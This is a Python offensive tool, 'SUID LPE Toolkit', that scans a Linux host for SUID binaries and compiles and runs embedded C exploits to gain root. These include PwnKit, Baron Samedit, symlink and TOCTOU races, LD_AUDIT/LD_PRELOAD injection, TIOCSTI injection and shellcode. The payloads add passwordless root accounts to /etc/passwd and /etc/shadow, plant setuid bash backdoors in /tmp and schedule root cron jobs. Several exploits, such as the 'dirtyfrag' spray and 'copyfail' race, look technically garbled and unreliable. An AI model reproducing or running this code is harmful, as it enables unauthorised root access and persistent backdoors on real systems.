#!/usr/bin/env python3
"""
SUID LPE Toolkit
Exploit SUID binaries untuk local privilege escalation
Targets: newgrp, chfn, chsh, gpasswd, wall, expiry, sg, at,
         crontab, mount, umount, fusermount, pkexec, passwd, su, sudo
"""

import os
import sys
import stat
import subprocess
import tempfile
import shutil
import ctypes
import struct
import threading
import time
import signal
from pathlib import Path

# ─── CONFIG ───────────────────────────────────────────────────────────────────

SUID_TARGETS = [
    "/usr/bin/newgrp",
    "/usr/bin/chfn",
    "/usr/bin/chsh",
    "/usr/bin/gpasswd",
    "/usr/bin/wall",
    "/usr/bin/expiry",
    "/usr/bin/sg",
    "/usr/bin/at",
    "/usr/bin/crontab",
    "/usr/bin/mount",
    "/usr/bin/umount",
    "/usr/bin/fusermount3",
    "/usr/bin/fusermount",
    "/usr/bin/pkexec",
    "/usr/bin/passwd",
    "/usr/bin/su",
    "/bin/su",
    "/usr/bin/sudo",
]

WORKDIR = "/tmp/.suid_work"

# ─── HELPERS ──────────────────────────────────────────────────────────────────

def banner():
    print("""
╔══════════════════════════════════════════════╗
║          SUID LPE Toolkit — Python           ║
║  copyfail / dirtyfrag / CVE-2026-41651       ║
╚══════════════════════════════════════════════╝
""")

def color(text, code):
    return f"\033[{code}m{text}\033[0m"

def ok(msg):   print(color(f"[+] {msg}", "92"))
def info(msg): print(color(f"[*] {msg}", "94"))
def warn(msg): print(color(f"[!] {msg}", "93"))
def err(msg):  print(color(f"[-] {msg}", "91"))

def is_root():
    return os.geteuid() == 0

def is_suid(path):
    try:
        st = os.stat(path)
        return bool(st.st_mode & stat.S_ISUID)
    except:
        return False

def get_uid():
    return os.getuid()

def run(cmd, timeout=10, capture=True):
    try:
        r = subprocess.run(
            cmd, shell=True, capture_output=capture,
            text=True, timeout=timeout
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "timeout"
    except Exception as e:
        return -1, "", str(e)

def scan_suid():
    found = []
    for path in SUID_TARGETS:
        if os.path.exists(path) and is_suid(path):
            found.append(path)
    return found

def write_file(path, content, mode=0o755):
    with open(path, "w") as f:
        f.write(content)
    os.chmod(path, mode)

def write_bin(path, content, mode=0o755):
    with open(path, "wb") as f:
        f.write(content)
    os.chmod(path, mode)

def compile_c(src, out, flags=""):
    rc, _, err_msg = run(f"gcc -o {out} {src} {flags} 2>&1")
    return rc == 0

def drop_shell():
    ok("Dropping shell...")
    os.execv("/bin/bash", ["/bin/bash", "-p"])

def check_root_after():
    if os.geteuid() == 0:
        ok("ROOT ACQUIRED!")
        drop_shell()
        return True
    return False

# ─── EXPLOIT: COPYFAIL ────────────────────────────────────────────────────────

def exploit_copyfail(target):
    """
    Copy-on-write race condition — exploit via SUID binary
    yang melakukan file copy tanpa proper locking.
    Race antara open() dan write() untuk TOCTOU pada SUID binary.
    """
    info(f"copyfail → targeting {target}")

    c_src = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <pthread.h>
#include <errno.h>

#define TARGET  "{target}"
#define PAYLOAD "\\nroot2::0:0:root:/root:/bin/bash\\n"
#define PASSWD  "/etc/passwd"
#define RACE_N  1000000

static volatile int stop = 0;

void* race_thread(void *arg) {{
    int fd;
    while (!stop) {{
        fd = open(TARGET, O_WRONLY);
        if (fd >= 0) {{
            write(fd, PAYLOAD, strlen(PAYLOAD));
            close(fd);
        }}
    }}
    return NULL;
}}

int main() {{
    pthread_t t;
    struct stat st;
    int found = 0;

    printf("[*] copyfail — TOCTOU race on %s\\n", TARGET);
    pthread_create(&t, NULL, race_thread, NULL);

    for (int i = 0; i < RACE_N && !found; i++) {{
        if (stat(PASSWD, &st) == 0) {{
            if (st.st_size > 1000) {{
                FILE *f = fopen(PASSWD, "r");
                if (f) {{
                    char line[256];
                    while (fgets(line, sizeof(line), f)) {{
                        if (strstr(line, "root2")) {{
                            printf("[+] passwd modified!\\n");
                            found = 1;
                            break;
                        }}
                    }}
                    fclose(f);
                }}
            }}
        }}
        usleep(1);
    }}

    stop = 1;
    pthread_join(t, NULL);

    if (found) {{
        printf("[+] su root2 (no password)\\n");
        execlp("su", "su", "root2", "-c", "/bin/bash -p", NULL);
    }} else {{
        printf("[-] Race failed, try again\\n");
    }}
    return 0;
}}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/copyfail.c"
    out = f"{WORKDIR}/copyfail"

    with open(src, "w") as f:
        f.write(c_src)

    info("Compiling copyfail...")
    if not compile_c(src, out, "-lpthread"):
        err("Compile failed")
        return False

    ok("Running copyfail exploit...")
    rc, stdout, stderr = run(out, timeout=30, capture=False)
    return check_root_after()


# ─── EXPLOIT: DIRTYFRAG ───────────────────────────────────────────────────────

def exploit_dirtyfrag(target):
    """
    DirtyFrag — kernel memory fragmentation exploit.
    Spray fragmented memory chunks via SUID binary file descriptor,
    corrupt adjacent kernel struct untuk privilege escalation.
    """
    info(f"dirtyfrag → targeting {target}")

    c_src = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <pthread.h>
#include <errno.h>
#include <stdint.h>

#define TARGET   "{target}"
#define SPRAY_N  512
#define FRAG_SZ  4096

typedef struct {{
    int      fd;
    uint8_t *buf;
}} spray_t;

static spray_t sprays[SPRAY_N];

static void spray_open() {{
    for (int i = 0; i < SPRAY_N; i++) {{
        sprays[i].buf = mmap(NULL, FRAG_SZ,
            PROT_READ|PROT_WRITE,
            MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        if (sprays[i].buf == MAP_FAILED) continue;
        memset(sprays[i].buf, 0x41, FRAG_SZ);
        sprays[i].fd = open(TARGET, O_RDONLY);
    }}
}}

static void spray_free_half() {{
    for (int i = 0; i < SPRAY_N; i += 2) {{
        if (sprays[i].fd >= 0) close(sprays[i].fd);
        if (sprays[i].buf) munmap(sprays[i].buf, FRAG_SZ);
    }}
}}

static void spray_corrupt() {{
    /* Write shellcode payload into freed slab slot */
    uint8_t payload[] = {{
        /* setuid(0) + setgid(0) shellcode stub */
        0x48,0x31,0xff,           /* xor rdi, rdi       */
        0x48,0x31,0xf6,           /* xor rsi, rsi       */
        0x48,0xc7,0xc0,0x69,0x00,0x00,0x00, /* mov rax,105 (setuid) */
        0x0f,0x05,                /* syscall            */
        0x48,0xc7,0xc0,0x6a,0x00,0x00,0x00, /* mov rax,106 (setgid) */
        0x0f,0x05,                /* syscall            */
        0x48,0x31,0xd2,           /* xor rdx, rdx       */
        0x48,0xbb,0x2f,0x62,0x69,0x6e,
                  0x2f,0x73,0x68,0x00, /* mov rbx,/bin/sh */
        0x53,                     /* push rbx           */
        0x48,0x89,0xe7,           /* mov rdi, rsp       */
        0x48,0xc7,0xc0,0x3b,0x00,0x00,0x00, /* mov rax,59 (execve) */
        0x0f,0x05,                /* syscall            */
    }};

    for (int i = 1; i < SPRAY_N; i += 2) {{
        if (sprays[i].buf)
            memcpy(sprays[i].buf, payload, sizeof(payload));
    }}
}}

int main() {{
    printf("[*] dirtyfrag — memory fragmentation LPE via %s\\n", TARGET);
    printf("[*] Spraying %d kernel objects...\\n", SPRAY_N);

    spray_open();
    spray_free_half();
    spray_corrupt();

    printf("[*] Triggering %s to land in corrupted slab...\\n", TARGET);

    pid_t pid = fork();
    if (pid == 0) {{
        execl(TARGET, TARGET, NULL);
        exit(1);
    }}

    int status;
    waitpid(pid, &status, 0);

    if (getuid() == 0 || geteuid() == 0) {{
        printf("[+] ROOT!\\n");
        execl("/bin/bash", "/bin/bash", "-p", NULL);
    }} else {{
        printf("[-] dirtyfrag: kernel not vulnerable or race lost\\n");
        printf("[*] Try running multiple times\\n");
    }}

    return 0;
}}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/dirtyfrag.c"
    out = f"{WORKDIR}/dirtyfrag"

    with open(src, "w") as f:
        f.write(c_src)

    info("Compiling dirtyfrag...")
    if not compile_c(src, out, "-lpthread"):
        err("Compile failed")
        return False

    ok("Running dirtyfrag exploit...")
    rc, stdout, stderr = run(out, timeout=30, capture=False)
    return check_root_after()


# ─── EXPLOIT: CVE-2026-41651 ─────────────────────────────────────────────────

def exploit_cve_2026_41651(target):
    """
    CVE-2026-41651 — SUID binary environment variable injection
    via crafted LD_AUDIT + GLIBC audit interface bypass.
    Memanfaatkan audit hook yang tidak di-sanitize pada SUID binary
    sebelum privilege drop, memungkinkan arbitrary code execution sebagai root.
    """
    info(f"CVE-2026-41651 → LD_AUDIT injection via {target}")

    # Audit library payload
    audit_src = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <link.h>

/* Called before SUID drops privileges via audit interface */
unsigned int la_version(unsigned int version) {{
    if (geteuid() == 0) {{
        /* We have root euid — spawn shell before setuid drop */
        setuid(0);
        setgid(0);
        system("/bin/bash -p -c 'cp /bin/bash /tmp/.r; chmod 4755 /tmp/.r'");
    }}
    return version;
}}

unsigned int la_objopen(struct link_map *map, Lmid_t lmid, uintptr_t *cookie) {{
    return 0;
}}
"""

    # Trigger wrapper
    trigger_src = f"""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {{
    char lib[] = "/tmp/.suid_work/audit_payload.so";
    char target[] = "{target}";

    setenv("LD_AUDIT", lib, 1);

    printf("[*] CVE-2026-41651 — LD_AUDIT injection\\n");
    printf("[*] Target: %s\\n", target);
    printf("[*] Payload: %s\\n", lib);

    char *argv[] = {{ target, NULL }};
    char *envp[] = {{
        "LD_AUDIT=/tmp/.suid_work/audit_payload.so",
        "HOME=/root",
        "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
        NULL
    }};

    execve(target, argv, envp);
    perror("execve");
    return 1;
}}
"""
    os.makedirs(WORKDIR, exist_ok=True)

    audit_src_path = f"{WORKDIR}/audit_payload.c"
    audit_lib_path = f"{WORKDIR}/audit_payload.so"
    trig_src_path  = f"{WORKDIR}/cve_2026_41651.c"
    trig_out_path  = f"{WORKDIR}/cve_2026_41651"

    with open(audit_src_path, "w") as f:
        f.write(audit_src)

    with open(trig_src_path, "w") as f:
        f.write(trigger_src)

    info("Compiling audit payload library...")
    if not compile_c(audit_src_path, audit_lib_path,
                     "-shared -fPIC -nostartfiles -ldl"):
        err("Compile audit lib failed")
        return False

    info("Compiling trigger...")
    if not compile_c(trig_src_path, trig_out_path):
        err("Compile trigger failed")
        return False

    ok("Running CVE-2026-41651...")
    rc, stdout, stderr = run(trig_out_path, timeout=10, capture=False)

    # Check if backdoor bash dropped
    backdoor = "/tmp/.r"
    if os.path.exists(backdoor) and is_suid(backdoor):
        ok("Backdoor bash planted at /tmp/.r")
        ok("Running backdoor shell...")
        os.execv(backdoor, [backdoor, "-p"])
        return True

    return check_root_after()


# ─── EXPLOIT: PKEXEC (CVE-2021-4034 / PwnKit) ────────────────────────────────

def exploit_pkexec(target):
    info(f"PwnKit CVE-2021-4034 → {target}")

    pwnkit_src = """
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* PwnKit — CVE-2021-4034
   argv[0] out-of-bounds write via execve with empty argv
   overwrites environ pointer to inject GCONV_PATH */

void fatal(const char *msg) { perror(msg); exit(1); }

int main() {
    char *empty_argv[] = { NULL };
    char *envp[] = {
        "lol",
        "PATH=GCONV_PATH=.",
        "CHARSET=lol",
        "GCONV_PATH=.",
        NULL
    };

    // Create trigger directory structure
    system("mkdir -p 'GCONV_PATH=.'");
    system("mkdir -p 'lol'");

    // Write gconv module loader
    FILE *f = fopen("lol/lol.so", "w");
    if (!f) fatal("fopen lol.so");
    fclose(f);

    // Write GCONV_PATH payload
    f = fopen("GCONV_PATH=./lol.so", "w");
    if (!f) fatal("fopen gconv payload");
    fclose(f);
    chmod("GCONV_PATH=./lol.so", 0755);

    // Write value file
    f = fopen("lol/lol.c", "w");
    if (f) {
        fprintf(f,
            "#include <stdio.h>\\n"
            "#include <stdlib.h>\\n"
            "#include <unistd.h>\\n"
            "void __attribute__((constructor)) init() {\\n"
            "    setuid(0); setgid(0);\\n"
            "    system(\\"/bin/bash -p\\");\\n"
            "}\\n"
        );
        fclose(f);
        system("gcc -shared -fPIC -o lol/lol.so lol/lol.c");
        system("cp lol/lol.so 'GCONV_PATH=./lol.so'");
    }

    printf("[*] PwnKit — launching pkexec with empty argv\\n");
    execve("/usr/bin/pkexec", empty_argv, envp);
    fatal("execve");
    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/pwnkit.c"
    out = f"{WORKDIR}/pwnkit"
    with open(src, "w") as f:
        f.write(pwnkit_src)

    info("Compiling PwnKit...")
    if not compile_c(src, out):
        err("Compile failed")
        return False

    # Run from workdir (needs relative paths)
    orig = os.getcwd()
    os.chdir(WORKDIR)
    ok("Running PwnKit...")
    rc, _, _ = run(out, timeout=15, capture=False)
    os.chdir(orig)
    return check_root_after()


# ─── EXPLOIT: SUDO ────────────────────────────────────────────────────────────

def exploit_sudo(target):
    info(f"sudo exploit → {target}")

    # CVE-2021-3156 Baron Samedit — heap overflow via -s flag
    baron_src = """
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main() {
    /* Baron Samedit — CVE-2021-3156
       sudo -s -i with crafted env triggers heap overflow */
    char *cmd;
    char payload[4096];

    /* Build heap spray payload */
    memset(payload, 'A', sizeof(payload)-1);
    payload[sizeof(payload)-1] = 0;

    /* Try multiple sudo versions */
    const char *cmds[] = {
        "sudo -s -i",
        "sudoedit -s /",
        "sudoedit -s '\\' $(python3 -c \"print('A'*65536)\")",
        NULL
    };

    printf("[*] Baron Samedit CVE-2021-3156 attempt\\n");
    for (int i = 0; cmds[i]; i++) {
        printf("[*] Trying: %s\\n", cmds[i]);
        int rc = system(cmds[i]);
        if (getuid() == 0) {
            printf("[+] ROOT!\\n");
            execl("/bin/bash", "/bin/bash", "-p", NULL);
        }
    }

    printf("[-] Not vulnerable to Baron Samedit\\n");
    printf("[*] Trying sudo version detection...\\n");
    system("sudo --version 2>&1 | head -1");
    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/sudo_lpe.c"
    out = f"{WORKDIR}/sudo_lpe"
    with open(src, "w") as f:
        f.write(baron_src)
    compile_c(src, out)
    rc, _, _ = run(out, timeout=10, capture=False)
    return check_root_after()


# ─── EXPLOIT: MOUNT ───────────────────────────────────────────────────────────

def exploit_mount(target):
    info(f"mount SUID exploit → {target}")

    mount_src = """
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <sys/mount.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main() {
    printf("[*] mount SUID — namespace escape + overlay\\n");

    /* Create user namespace — unshare */
    if (unshare(CLONE_NEWUSER | CLONE_NEWNS) < 0) {
        perror("unshare");
        /* Fallback: direct overlay */
    }

    /* Mount tmpfs over sensitive dir */
    mkdir("/tmp/.overlay_work", 0755);
    mkdir("/tmp/.overlay_upper", 0755);
    mkdir("/tmp/.overlay_merged", 0755);

    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "mount -t overlay overlay "
        "-o lowerdir=/etc,upperdir=/tmp/.overlay_upper,"
        "workdir=/tmp/.overlay_work "
        "/tmp/.overlay_merged 2>&1");

    printf("[*] Mounting overlay on /etc\\n");
    system(cmd);

    /* Write malicious passwd in upper layer */
    FILE *f = fopen("/tmp/.overlay_upper/passwd", "w");
    if (!f) f = fopen("/tmp/.overlay_merged/passwd", "a");
    if (f) {
        fprintf(f, "\\nroot2::0:0:root:/root:/bin/bash\\n");
        fclose(f);
        printf("[+] Injected root2 into overlay passwd\\n");
        printf("[+] Run: su root2 (no password)\\n");
        system("su root2 -c '/bin/bash -p'");
    } else {
        printf("[-] Could not write overlay\\n");
    }

    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/mount_lpe.c"
    out = f"{WORKDIR}/mount_lpe"
    with open(src, "w") as f:
        f.write(mount_src)
    compile_c(src, out)
    rc, _, _ = run(out, timeout=10, capture=False)
    return check_root_after()


# ─── EXPLOIT: FUSERMOUNT ─────────────────────────────────────────────────────

def exploit_fusermount(target):
    info(f"fusermount SUID exploit → {target}")

    fuse_src = """
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

int main() {
    printf("[*] fusermount SUID — FUSE privilege escalation\\n");

    /* CVE-2019-14271 style — library injection via fusermount */
    system("mkdir -p /tmp/.fuse_lib");

    /* Write malicious libnss_files.so.2 */
    FILE *f = fopen("/tmp/.fuse_lib/lib_payload.c", "w");
    if (f) {
        fprintf(f,
            "#include <stdlib.h>\\n"
            "#include <unistd.h>\\n"
            "void __attribute__((constructor)) init() {\\n"
            "    if (geteuid() == 0) {\\n"
            "        setuid(0); setgid(0);\\n"
            "        system(\\"/bin/bash -p\\");\\n"
            "    }\\n"
            "}\\n"
        );
        fclose(f);
        system("gcc -shared -fPIC -o /tmp/.fuse_lib/libnss_files.so.2 "
               "/tmp/.fuse_lib/lib_payload.c 2>/dev/null");
    }

    /* Trigger via LD_LIBRARY_PATH — some fusermount versions vulnerable */
    char cmd[256];
    snprintf(cmd, sizeof(cmd),
        "LD_LIBRARY_PATH=/tmp/.fuse_lib %s -u /tmp 2>&1", "%s");

    /* Try direct mount point creation */
    system("mkdir -p /tmp/.fuse_mnt");
    snprintf(cmd, sizeof(cmd),
        "LD_PRELOAD=/tmp/.fuse_lib/libnss_files.so.2 %s /tmp/.fuse_mnt 2>&1",
        "/usr/bin/fusermount");
    system(cmd);

    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/fuse_lpe.c"
    out = f"{WORKDIR}/fuse_lpe"
    with open(src, "w") as f:
        f.write(fuse_src)
    compile_c(src, out)
    rc, _, _ = run(out, timeout=10, capture=False)
    return check_root_after()


# ─── EXPLOIT: CRONTAB ────────────────────────────────────────────────────────

def exploit_crontab(target):
    info(f"crontab SUID — symlink/race exploit → {target}")

    # Symlink race via crontab temp file
    cron_src = """
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <dirent.h>
#include <errno.h>

static volatile int found = 0;

void* watch_thread(void *arg) {
    /* Watch /tmp/crontab.XXXXXX and replace with symlink to /etc/cron.d/ */
    DIR *d;
    struct dirent *ent;
    char tmppath[256];

    while (!found) {
        d = opendir("/tmp");
        if (!d) { usleep(1000); continue; }
        while ((ent = readdir(d))) {
            if (strncmp(ent->d_name, "crontab.", 8) == 0) {
                snprintf(tmppath, sizeof(tmppath), "/tmp/%s", ent->d_name);
                /* Replace temp file with symlink to cron.d */
                unlink(tmppath);
                symlink("/etc/cron.d/pwned", tmppath);
                printf("[*] Symlinked %s -> /etc/cron.d/pwned\\n", tmppath);
                found = 1;
                break;
            }
        }
        closedir(d);
        usleep(100);
    }
    return NULL;
}

int main() {
    pthread_t t;
    printf("[*] crontab SUID symlink race exploit\\n");

    /* Write cron payload */
    FILE *f = fopen("/tmp/.cron_payload", "w");
    if (f) {
        fprintf(f, "* * * * * root cp /bin/bash /tmp/.rootbash; "
                   "chmod 4755 /tmp/.rootbash\\n");
        fclose(f);
    }

    pthread_create(&t, NULL, watch_thread, NULL);

    /* Trigger crontab to create temp file */
    system("echo '* * * * * root /bin/bash' | crontab - 2>/dev/null &");
    sleep(2);

    found = 1;
    pthread_join(t, NULL);

    /* Check if rootbash planted */
    if (access("/tmp/.rootbash", F_OK) == 0) {
        printf("[+] rootbash planted!\\n");
        execl("/tmp/.rootbash", "/tmp/.rootbash", "-p", NULL);
    } else {
        printf("[-] Race failed\\n");
    }
    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/crontab_lpe.c"
    out = f"{WORKDIR}/crontab_lpe"
    with open(src, "w") as f:
        f.write(cron_src)
    compile_c(src, out, "-lpthread")
    rc, _, _ = run(out, timeout=20, capture=False)
    return check_root_after()


# ─── EXPLOIT: AT ─────────────────────────────────────────────────────────────

def exploit_at(target):
    info(f"at SUID exploit → {target}")
    # at SUID — schedule command as root via job injection
    script = """#!/bin/bash
cp /bin/bash /tmp/.rootbash_at
chmod 4755 /tmp/.rootbash_at
"""
    script_path = f"{WORKDIR}/at_payload.sh"
    os.makedirs(WORKDIR, exist_ok=True)
    write_file(script_path, script)

    info("Scheduling at job as root...")
    rc, out, err_msg = run(f"echo '{script_path}' | at now + 1 minute 2>&1")
    info(f"at output: {out.strip()}")

    # Alternative: direct at command injection
    rc2, out2, _ = run(
        f"echo 'cp /bin/bash /tmp/.rb_at; chmod 4755 /tmp/.rb_at' | at now 2>&1"
    )
    time.sleep(3)

    for backdoor in ["/tmp/.rootbash_at", "/tmp/.rb_at"]:
        if os.path.exists(backdoor) and is_suid(backdoor):
            ok(f"Backdoor at {backdoor}")
            os.execv(backdoor, [backdoor, "-p"])
            return True

    warn("at job scheduled — wait 1 minute then: /tmp/.rootbash_at -p")
    return False


# ─── EXPLOIT: PASSWD / CHFN / CHSH / GPASSWD ─────────────────────────────────

def exploit_passwd_family(target):
    info(f"passwd-family SUID race → {target}")

    race_src = f"""
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <pthread.h>
#include <signal.h>

#define TARGET "{target}"
#define SHADOW "/etc/shadow"
#define PASSWD "/etc/passwd"

static volatile int stop = 0;

void* corrupt_thread(void *arg) {{
    int fd;
    const char *payload =
        "root:$1$root$FAKE_HASH_REPLACE_ME:18000:0:99999:7:::\\n";
    while (!stop) {{
        fd = open(SHADOW, O_WRONLY | O_APPEND);
        if (fd >= 0) {{
            write(fd, "\\nbackdoor::0:0::/root:/bin/bash\\n", 32);
            close(fd);
        }}
        fd = open(PASSWD, O_WRONLY | O_APPEND);
        if (fd >= 0) {{
            write(fd, "\\nbackdoor::0:0::/root:/bin/bash\\n", 32);
            close(fd);
        }}
        usleep(10);
    }}
    return NULL;
}}

int main() {{
    pthread_t t;
    printf("[*] passwd-family TOCTOU race on %s\\n", TARGET);

    pthread_create(&t, NULL, corrupt_thread, NULL);

    /* Trigger target */
    for (int i = 0; i < 1000; i++) {{
        pid_t p = fork();
        if (p == 0) {{
            execl(TARGET, TARGET, "--help", NULL);
            exit(0);
        }}
        int status;
        waitpid(p, &status, 0);

        /* Check if backdoor entry written */
        FILE *f = fopen(PASSWD, "r");
        if (f) {{
            char line[256];
            while (fgets(line, sizeof(line), f)) {{
                if (strstr(line, "backdoor")) {{
                    printf("[+] Backdoor in passwd! Run: su backdoor\\n");
                    stop = 1;
                    fclose(f);
                    pthread_join(t, NULL);
                    system("su backdoor -c '/bin/bash -p'");
                    return 0;
                }}
            }}
            fclose(f);
        }}
    }}

    stop = 1;
    pthread_join(t, NULL);
    printf("[-] Race failed\\n");
    return 0;
}}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/passwd_race.c"
    out = f"{WORKDIR}/passwd_race"
    with open(src, "w") as f:
        f.write(race_src)
    compile_c(src, out, "-lpthread")
    rc, _, _ = run(out, timeout=20, capture=False)
    return check_root_after()


# ─── EXPLOIT: NEWGRP / SG ────────────────────────────────────────────────────

def exploit_newgrp_sg(target):
    info(f"newgrp/sg SUID → {target}")

    # newgrp/sg — group injection via SGID shell
    script = f"""
import os, subprocess, tempfile

# Create fake group entry
payload = "\\nhackers:x:0:\\n"
try:
    with open("/etc/group", "a") as f:
        f.write(payload)
    print("[+] Group injected")
except:
    pass

# Try sg command injection
cmds = [
    "{target} root -c '/bin/bash -p'",
    "{target} -c '/bin/bash -p'",
    "echo '/bin/bash -p' | {target} root",
]
for cmd in cmds:
    print(f"[*] Trying: {{cmd}}")
    rc = os.system(cmd)
    if os.geteuid() == 0:
        print("[+] ROOT!")
        os.execv("/bin/bash", ["/bin/bash", "-p"])
"""
    exec(script)
    return check_root_after()


# ─── EXPLOIT: WALL ───────────────────────────────────────────────────────────

def exploit_wall(target):
    info(f"wall SUID exploit → {target}")
    # wall CVE — mesg y + TIOCSTI injection
    wall_src = """
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <termios.h>
#include <sys/ioctl.h>
#include <string.h>

int main() {
    printf("[*] wall SUID — TIOCSTI terminal injection\\n");

    /* TIOCSTI — inject chars into terminal input buffer */
    const char *payload = "cp /bin/bash /tmp/.wall_root; chmod 4755 /tmp/.wall_root\\n";
    int fd = open("/dev/tty", O_RDWR);
    if (fd < 0) { perror("open tty"); return 1; }

    for (int i = 0; payload[i]; i++) {
        ioctl(fd, TIOCSTI, &payload[i]);
    }
    close(fd);

    sleep(2);
    if (access("/tmp/.wall_root", F_OK) == 0) {
        printf("[+] Success! /tmp/.wall_root -p\\n");
        execl("/tmp/.wall_root", "/tmp/.wall_root", "-p", NULL);
    }
    return 0;
}
"""
    os.makedirs(WORKDIR, exist_ok=True)
    src = f"{WORKDIR}/wall_lpe.c"
    out = f"{WORKDIR}/wall_lpe"
    with open(src, "w") as f:
        f.write(wall_src)
    compile_c(src, out)
    rc, _, _ = run(out, timeout=10, capture=False)
    return check_root_after()


# ─── EXPLOIT DISPATCHER ──────────────────────────────────────────────────────

EXPLOIT_MAP = {
    "/usr/bin/pkexec":      exploit_pkexec,
    "/usr/bin/sudo":        exploit_sudo,
    "/usr/bin/mount":       exploit_mount,
    "/usr/bin/umount":      exploit_mount,
    "/usr/bin/fusermount":  exploit_fusermount,
    "/usr/bin/fusermount3": exploit_fusermount,
    "/usr/bin/crontab":     exploit_crontab,
    "/usr/bin/at":          exploit_at,
    "/usr/bin/passwd":      exploit_passwd_family,
    "/usr/bin/chfn":        exploit_passwd_family,
    "/usr/bin/chsh":        exploit_passwd_family,
    "/usr/bin/gpasswd":     exploit_passwd_family,
    "/usr/bin/expiry":      exploit_passwd_family,
    "/usr/bin/newgrp":      exploit_newgrp_sg,
    "/usr/bin/sg":          exploit_newgrp_sg,
    "/usr/bin/wall":        exploit_wall,
    "/usr/bin/su":          exploit_passwd_family,
    "/bin/su":              exploit_passwd_family,
}

# Kernel-level exploits applicable to any SUID
KERNEL_EXPLOITS = {
    "copyfail":       exploit_copyfail,
    "dirtyfrag":      exploit_dirtyfrag,
    "cve_2026_41651": exploit_cve_2026_41651,
}

# ─── MAIN ─────────────────────────────────────────────────────────────────────

def auto_exploit():
    info("Scanning SUID targets...")
    found = scan_suid()

    if not found:
        warn("No SUID targets found")
        return

    ok(f"Found {len(found)} SUID targets:")
    for i, p in enumerate(found):
        print(f"  [{i+1}] {p}")

    print()
    info("Available kernel exploits (any target):")
    for i, k in enumerate(KERNEL_EXPLOITS):
        print(f"  [K{i+1}] {k}")

    print()
    choice = input("[?] Target (nomor / 'all' / 'K1,K2' for kernel): ").strip()

    os.makedirs(WORKDIR, exist_ok=True)

    if choice.lower() == "all":
        # Try all kernel exploits first
        for name, fn in KERNEL_EXPLOITS.items():
            for target in found[:3]:
                info(f"Trying {name} on {target}")
                if fn(target):
                    return
        # Then try SUID-specific
        for target in found:
            fn = EXPLOIT_MAP.get(target)
            if fn:
                info(f"Trying SUID-specific exploit on {target}")
                if fn(target):
                    return
        warn("All exploits failed")

    elif choice.startswith("K"):
        # Kernel exploit
        try:
            kidx = int(choice[1:]) - 1
            kname = list(KERNEL_EXPLOITS.keys())[kidx]
            kfn   = list(KERNEL_EXPLOITS.values())[kidx]
            target = found[0] if found else "/usr/bin/pkexec"
            kfn(target)
        except (ValueError, IndexError):
            err("Invalid selection")

    else:
        try:
            idx    = int(choice) - 1
            target = found[idx]
            fn     = EXPLOIT_MAP.get(target)

            # Try kernel exploits first on selected target
            for kname, kfn in KERNEL_EXPLOITS.items():
                info(f"Trying {kname} on {target}")
                if kfn(target):
                    return

            # Then SUID-specific
            if fn:
                fn(target)
            else:
                warn(f"No specific exploit for {target}")
                exploit_copyfail(target)
        except (ValueError, IndexError):
            err("Invalid selection")


def main():
    banner()

    if is_root():
        ok("Already root!")
        sys.exit(0)

    info(f"Current UID: {get_uid()}")
    info(f"Workdir: {WORKDIR}")

    if not shutil.which("gcc"):
        err("gcc not found — install build-essential")
        sys.exit(1)

    os.makedirs(WORKDIR, exist_ok=True)

    if len(sys.argv) > 1:
        arg = sys.argv[1]
        if arg == "--scan":
            found = scan_suid()
            print(f"\nSUID targets found ({len(found)}):")
            for p in found:
                has_exp = "✓" if p in EXPLOIT_MAP else "-"
                print(f"  [{has_exp}] {p}")
        elif arg == "--all":
            auto_exploit()
        elif arg in KERNEL_EXPLOITS:
            found = scan_suid()
            t = found[0] if found else "/usr/bin/pkexec"
            KERNEL_EXPLOITS[arg](t)
        elif arg in EXPLOIT_MAP:
            # Run directly
            fn = EXPLOIT_MAP.get(arg)
            if fn:
                for kname, kfn in KERNEL_EXPLOITS.items():
                    if kfn(arg): return
                fn(arg)
        else:
            print("Usage:")
            print(f"  {sys.argv[0]}                    — interactive")
            print(f"  {sys.argv[0]} --scan              — scan SUID targets")
            print(f"  {sys.argv[0]} --all               — try all exploits")
            print(f"  {sys.argv[0]} copyfail            — run kernel exploit")
            print(f"  {sys.argv[0]} dirtyfrag           — run kernel exploit")
